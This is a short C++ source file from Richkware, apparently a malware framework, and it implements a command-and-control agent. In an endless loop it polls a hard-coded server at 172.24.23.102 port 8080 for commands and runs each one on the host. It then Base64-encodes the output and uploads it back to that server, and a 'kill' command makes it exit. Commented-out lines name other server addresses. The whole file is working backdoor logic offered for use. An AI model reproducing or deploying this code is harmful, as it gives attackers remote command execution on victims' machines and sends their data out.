/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*      Created by bladez on 13/06/19.
*/

#include "src/richkware.h"
#include "src/utils.h"


int main() {
    // with RichkwareManagerServer
    Richkware richkware("Richk", "richktest", "172.24.23.102", "8080", "er@fv.it");
    // without RichkwareManagerServer
    //Richkware richkware("Richk","richktest");

    // PUT YOUR CODE HERE
//    richkware.network.fetchCommand("172.17.238.81", "8080", "er@fv.it", "Richk");
//    richkware.executeCommands();
    std::vector <std::string> commands = richkware.getCommands("172.24.23.102", "8080");
    while (true) {
        while (commands.size() == 1 && commands.at(0) == "") {
            commands = richkware.getCommands("172.24.23.102", "8080");
            std::cout << "waiting for commands..." << std::endl;
            Sleep(5000);
        }
        std::cout << "commands found: " << commands.size() << std::endl;
        std::string response = "";
        for (size_t i = 0; i < commands.size() - 1; ++i) {
            std::cout << "executing..." << commands.at(i) << std::endl;
            if (commands.at(i) == "kill") {
                return 0;
            }
            std::string resp = richkware.executeCommand(commands.at(i));
            response.append(/*Base64_encode(*/resp/*, resp.size())*/ + "##");
            //        commands = richkware.updateCommands("172.24.51.229", "8080", utils::concatVector(commands, "##"));
            //        commands.pop_back();
        }
        response.append(/*Base64_encode(*/richkware.executeCommand(commands.at(commands.size() - 1)))/*)*/;
        richkware.uploadCommandsResponse(Base64_encode((const unsigned char *) response.c_str(), response.size()),
                                         "172.24.23.102", "8080");
        std::cout << "response uploaded! (" << response << ")" << std::endl;
        commands.clear();
        system("PAUSE");
    }
}


